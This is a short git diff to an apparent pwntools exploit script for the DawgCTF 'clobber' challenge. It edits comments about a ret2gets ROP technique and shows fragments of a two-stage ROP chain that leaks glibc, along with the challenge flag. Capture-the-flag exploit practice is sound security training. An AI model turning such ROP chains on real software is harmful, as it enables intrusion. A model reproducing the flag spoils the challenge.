@@ -12,7 +12,7 @@ p = gdb.debug('./clobber_patched', '''
 
 # p = remote('clobber.umbccd.net', 13373)
 
-# Stage 1: ROP to leak tls (glibc)
+# Stage 1: ROP to leak tls/glibc (ret2gets)
 e = ELF('./clobber_patched')
 chain1 = [
     e.plt.gets,
@@ -45,5 +45,4 @@ p.sendline(b'b'*0x20+p64(0)+b''.join([p64(c2) for c2 in chain2]))   # ROP's main
 
 p.interactive()
 
-# https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets
 # DawgCTF{p1v0t_4nd_cl0bb3r}
